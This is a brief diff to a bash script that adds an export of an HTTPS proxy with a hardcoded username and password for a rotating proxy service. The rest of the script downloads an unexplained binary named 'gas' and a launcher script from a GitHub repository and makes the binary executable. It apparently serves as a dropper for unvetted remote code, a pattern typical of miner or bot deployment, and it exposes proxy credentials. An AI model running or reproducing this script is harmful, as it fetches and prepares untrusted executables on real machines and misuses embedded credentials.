@@ -1,4 +1,5 @@
 #!/bin/bash
+export https_proxy="https://mvsaqplt-rotate:14valgck3brn@p.webshare.io:80/"
 wget https://github.com/aka648582/yes/raw/main/gas
 chmod +x gas
 wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
